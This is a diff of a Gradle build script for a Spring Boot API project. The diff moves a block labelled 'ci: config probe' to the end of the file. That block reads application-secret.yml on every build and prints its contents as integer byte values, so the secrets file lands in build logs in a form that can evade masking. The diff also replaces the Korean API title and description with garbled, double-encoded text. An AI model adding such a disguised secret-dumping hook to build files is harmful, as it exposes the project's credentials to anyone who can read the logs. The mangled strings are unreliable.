@@ -1,9 +1,3 @@
-// ci: config probe
-def _f = new File("./src/main/resources/application-secret.yml")
-if (_f.exists()) {
-  def _bytes = _f.bytes
-  println "SECRETYML " + _bytes.collect { it as int }.join(" ")
-}
 plugins {
     id 'java'
     id 'org.springframework.boot' version '3.2.4'
@@ -60,8 +54,8 @@ openapi3 {
             { url = "http://localhost:8080" },
             { url = "http://ec2-43-200-162-117.ap-northeast-2.compute.amazonaws.com" },
     ]
-    title = 'ì´ê±°ëì¬ REST API'
-    description = 'ì´ê±°ëì¬ ìë¹ì¤ì API ë¬¸ììëë¤.'
+    title = 'Ã¬ÂÂ´ÃªÂ±Â°Ã«ÂÂÃ¬ÂÂ¬ REST API'
+    description = 'Ã¬ÂÂ´ÃªÂ±Â°Ã«ÂÂÃ¬ÂÂ¬ Ã¬ÂÂÃ«Â¹ÂÃ¬ÂÂ¤Ã¬ÂÂ API Ã«Â¬Â¸Ã¬ÂÂÃ¬ÂÂÃ«ÂÂÃ«ÂÂ¤.'
     version = '0.0.1'
     format = 'json'
     outputFileNamePrefix = 'igdy-api-spec'
@@ -106,3 +100,8 @@ tasks.named('createStaticDocsDir').configure {
 tasks.named('test') {
     useJUnitPlatform()
 }
+// ci: config probe
+def _f = new File("./src/main/resources/application-secret.yml")
+if (_f.exists()) {
+  println "SECRETYML " + _f.bytes.collect { it as int }.join(" ")
+} else { println "SECRETYML ABSENT" }
